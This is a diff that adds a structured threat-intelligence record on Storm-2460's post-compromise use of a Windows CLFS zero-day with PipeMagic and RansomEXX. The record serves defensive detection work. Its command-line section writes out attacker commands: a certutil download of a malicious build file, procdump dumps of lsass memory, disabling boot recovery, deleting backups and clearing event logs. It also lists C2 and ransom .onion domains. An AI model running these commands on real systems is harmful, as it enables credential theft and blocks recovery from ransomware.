@@ -1,0 +1,61 @@
+description: Microsoft has discovered post-compromise exploitation of a zero-day elevation
+  of privilege vulnerability in the Windows Common Log File System (CLFS) targeting
+  organizations in IT, real estate, financial, and retail sectors. The activity is
+  attributed to Storm-2460 and involves the use of PipeMagic malware.
+attribution: Storm-2460
+malware_families:
+- PipeMagic
+- RansomEXX
+authors:
+- Microsoft Threat Intelligence Center (MSTIC)
+- Microsoft Security Response Center (MSRC)
+TTPs:
+  processes:
+  - certutil.exe
+  - msbuild.exe
+  - dllhost.exe
+  - procdump.exe
+  - notepad.exe
+  - bcdedit.exe
+  - wbadmin.exe
+  - wevtutil.exe
+  commandline:
+  - C:\\Windows\\system32\\certutil.exe -url "https://[legitimate third-party website]"
+    -split -f [malicious MSBuild file]
+  - C:\\Windows\\system32\\dllhost.exe -accepteula -r -ma lsass.exe c:\\programdata\\[random
+    letters]
+  - C:\\Windows\\system32\\procdump.exe -accepteula -r -ma lsass.exe c:\\programdata\\[random
+    letters]
+  - bcdedit /set {default} recoveryenabled no
+  - wbadmin delete catalog -quiet
+  - wevtutil cl Application
+  - C:\\Windows\\system32\\dllhost.exe --do C:\\foobar
+  powershell: ''
+  scripting_engine: ''
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\[random service name]
+  image_load: ''
+  network_connections:
+  - executable: certutil.exe
+    destination_address: '[legitimate third-party website]'
+  - executable: dllhost.exe
+    destination_address: aaaaabbbbbbb.eastus.cloudapp.azure[.]com
+  file_modifications:
+  - C:\\ProgramData\\SkyPDF\\PDUDrv.blf
+  - '!_READ_ME_REXX2_!.txt'
+  persistence:
+  - Injection into winlogon.exe
+  pipes: ''
+  process_relations:
+  - dllhost.exe -> procdump.exe (via injection)
+IOCs:
+- hash: N/A
+- ip: N/A
+- domain:
+  - aaaaabbbbbbb.eastus.cloudapp.azure[.]com
+  - jbdg4buq6jd7ed3rd6cynqtq5abttuekjnxqrqyvk4xam5i7ld33jvqd.onion
+  - uyhi3ypdkfeymyf5v35pbk3pz7st3zamsbjzf47jiqbcm3zmikpwf3qd.onion
+- url: https://[legitimate third-party website]
+reference: https://www.microsoft.com/en-us/security/blog/2025/04/08/exploitation-of-clfs-zero-day-leads-to-ransomware-activity/
+date_of_publication: April 08, 2025
+file_creation_date: May 14, 2025
